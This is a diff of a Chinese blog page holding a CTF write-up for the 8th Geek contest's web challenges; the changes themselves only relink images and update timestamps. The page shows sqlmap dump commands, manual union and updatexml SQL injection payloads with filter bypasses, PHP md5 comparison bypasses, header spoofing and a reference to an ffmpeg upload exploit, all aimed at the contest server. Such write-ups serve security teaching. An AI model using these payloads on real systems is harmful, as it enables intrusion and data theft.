@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2017-10-20 16:07</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:18'>2017-10-20 16:07</time>
         
     </div>
     <div class="article-meta">
@@ -776,9 +778,9 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="第八届Geek部分web"><a href="#第八届Geek部分web" class="headerlink" title="第八届Geek部分web"></a>第八届Geek部分web</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="故道白云"><a href="#故道白云" class="headerlink" title="故道白云"></a>故道白云</h3><h4 id="方法一sqlmap："><a href="#方法一sqlmap：" class="headerlink" title="方法一sqlmap："></a>方法一sqlmap：</h4><p>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ –dbs<br>查找表<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag –tables<br>通过2中的表得出列名<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag –columns<br>获取字段的值<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag -C “f4ag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201711051714_889.png" alt=""></p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711052126_103.png" alt=""><br>SYC{HACKEr_By-cL0und}</p>
-<h4 id="方法二手注："><a href="#方法二手注：" class="headerlink" title="方法二手注："></a>方法二手注：</h4><p>首先测试<br>这里写图片描述<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222316_785.png" alt=""><br>没有过滤#号，然后应该就知道干啥了</p>
+        <h1 id="第八届Geek部分web"><a href="#第八届Geek部分web" class="headerlink" title="第八届Geek部分web"></a>第八届Geek部分web</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="故道白云"><a href="#故道白云" class="headerlink" title="故道白云"></a>故道白云</h3><h4 id="方法一sqlmap："><a href="#方法一sqlmap：" class="headerlink" title="方法一sqlmap："></a>方法一sqlmap：</h4><p>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ –dbs<br>查找表<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag –tables<br>通过2中的表得出列名<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag –columns<br>获取字段的值<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag -C “f4ag” –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711051714_889.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711052126_103.png" alt=""><br>SYC{HACKEr_By-cL0und}</p>
+<h4 id="方法二手注："><a href="#方法二手注：" class="headerlink" title="方法二手注："></a>方法二手注：</h4><p>首先测试<br>这里写图片描述<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222316_785.png" alt=""><br>没有过滤#号，然后应该就知道干啥了</p>
 <pre><code>http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select 1,1%23
 
 http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select SCHEMA_NAME,1 from information_schema.SCHEMATA limit 1,1%23
@@ -791,10 +793,10 @@ http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select f4ag,1 from
 </code></pre><p>SYC{HACKEr_By-cL0und}</p>
 <h3 id="粗心的李超"><a href="#粗心的李超" class="headerlink" title="粗心的李超"></a>粗心的李超</h3><p>通过dirb扫描后台</p>
 <p>备份文件泄露，index.php.bak</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711222347_913.png" alt=""><br>flag:SYC{just_brute_is_ok!}</p>
-<h3 id="Buy-me-a-Tesla"><a href="#Buy-me-a-Tesla" class="headerlink" title="Buy me a Tesla"></a>Buy me a Tesla</h3><p>一看sign参数就有猫腻<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222348_221.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222347_913.png" alt=""><br>flag:SYC{just_brute_is_ok!}</p>
+<h3 id="Buy-me-a-Tesla"><a href="#Buy-me-a-Tesla" class="headerlink" title="Buy me a Tesla"></a>Buy me a Tesla</h3><p>一看sign参数就有猫腻<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222348_221.png" alt=""></p>
 <p>发现就是url解密一下然后base64解密三次即可</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711222350_33.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222350_33.png" alt=""></p>
 <p>反编码<br>带入sign</p>
 <p>SYC{KeYiGeiWoMaiYiGeZhenDeTeslaMa?}</p>
 <h3 id="PHP的悖论1"><a href="#PHP的悖论1" class="headerlink" title="PHP的悖论1"></a>PHP的悖论1</h3><p>题目：</p>
@@ -807,13 +809,13 @@ http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select f4ag,1 from
 <p>2.大致了解了基本含义之后剖析题目，这个if语句成立的条件是s1和s2的值和类型都不相同，并且其经过MD5加密之后的值和类型要完全相同。看起来有点绕，并且毫无思路。看了一个博客就get了，附上链接<a href="http://www.cnblogs.com/weidiao/p/6821812.html。" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html。</a></p>
 <p>3.可以知道，如果将s1和s2都变为数组，并且值不同，便可以满足if的条件，得到flag。<br>关键语句</p>
 <pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) === md5($_POST[&#39;s2&#39;])) { echo $flag; }
-</code></pre><p>这个很容易就想到是利用md5处理数组的漏洞了吧，构造如下即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222354_648.png" alt=""></p>
+</code></pre><p>这个很容易就想到是利用md5处理数组的漏洞了吧，构造如下即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222354_648.png" alt=""></p>
 <h3 id="PHP的悖论2"><a href="#PHP的悖论2" class="headerlink" title="PHP的悖论2"></a>PHP的悖论2</h3><p>题目：</p>
 <p><a href="http://game.sycsec.com:2009/20022.php" target="_blank" rel="external">http://game.sycsec.com:2009/20022.php</a></p>
 <p>解题思路：<br>仔细看看会发现‘===’变成了‘==’，于是只需要值相等，网上搜了搜字符串不同但MD5相等</p>
 <pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) == md5($_POST[&#39;s2&#39;])) { echo $flag; }
-</code></pre><p>于是构造payload：<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222354_397.png" alt=""><br>240610708<br>s878926199a<br>SYC{Y0u_g0th3w4y_to_k111==}</p>
-<h3 id="视频播放器"><a href="#视频播放器" class="headerlink" title="视频播放器"></a>视频播放器</h3><p>这个还是非常好玩儿的，利用的是一个ffmpeg的漏洞，这个原理有些厉害了，但是利用过程十分简单<br><a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="external">http://www.freebuf.com/vuls/138377.html</a><br>然后下载源码，生成恶意文件<br>然后上传恶意文件即可读到flag<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222355_205.png" alt=""></p>
+</code></pre><p>于是构造payload：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222354_397.png" alt=""><br>240610708<br>s878926199a<br>SYC{Y0u_g0th3w4y_to_k111==}</p>
+<h3 id="视频播放器"><a href="#视频播放器" class="headerlink" title="视频播放器"></a>视频播放器</h3><p>这个还是非常好玩儿的，利用的是一个ffmpeg的漏洞，这个原理有些厉害了，但是利用过程十分简单<br><a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="external">http://www.freebuf.com/vuls/138377.html</a><br>然后下载源码，生成恶意文件<br>然后上传恶意文件即可读到flag<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222355_205.png" alt=""></p>
 <p>SYC{WhatIsExpFuckNoLiaoDe???}</p>
 <h3 id="iPhone-X"><a href="#iPhone-X" class="headerlink" title="iPhone X"></a>iPhone X</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>题目提示要iPhone X访问，需要UA头包含CPU iPhone OS X字样，之后提示IP不符合规则，同时修改xff和ref头尾127.0.0.1得到flag</p>
 <pre><code>GET /web_competition/geekCompetition/web_3/ HTTP/1.1
@@ -825,9 +827,9 @@ Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
 X-FORWARDED-FOR: 127.0.0.1
 Connection: close
 Upgrade-Insecure-Requests: 1
-</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>0x01 抓包<br>0x02 改包<br>由于题目说只有iphoneX才能接受这个website，所以联想到要将user-agent改为iPhone的版本。<br>如图，好不容易找到iphone的user-agent，它却说ip不对，改x-forward-for为127.0.0.1，没懂hh。用modify headers，于是来到第三步。<br><img src="http://oy0tigw51.bkt.clouddn.com/201711230000_413.png" alt=""></p>
+</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>0x01 抓包<br>0x02 改包<br>由于题目说只有iphoneX才能接受这个website，所以联想到要将user-agent改为iPhone的版本。<br>如图，好不容易找到iphone的user-agent，它却说ip不对，改x-forward-for为127.0.0.1，没懂hh。用modify headers，于是来到第三步。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711230000_413.png" alt=""></p>
 <p>0x03 改IP</p>
-<p>看网上的安装和使用的博客，于是得到如图<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222358_212.png" alt=""><br>0x04 Get_the_flag</p>
+<p>看网上的安装和使用的博客，于是得到如图<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222358_212.png" alt=""><br>0x04 Get_the_flag</p>
 <p>改了之后重新抓包，改包，go了之后发现还是一样，黑人问号？？？一定是modify headers没用对，返回看了下，发现还要点个start，难受了。<br>再来一遍抓包改包，得到flag。</p>
 <p>Tip：之后发现可以直接在repeater里加X-Forwarded-For:127.0.0.1，也能拿到flag。</p>
 <p>SYC{UA_AND_IP_COULD_BE<em>FORGED</em>!!!}</p>
@@ -868,7 +870,7 @@ sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0f4ag%a0fr+om%a0f1ag
     <p><span>文章字数:</span><span class="post-count">1,545</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2017-10-20, 16:07:05</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:18</p>
     <span>原始链接:</span><a class="post-url" href="/archives/83955867/" title="第八届Geek部分web">http://mang0.me/archives/83955867/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
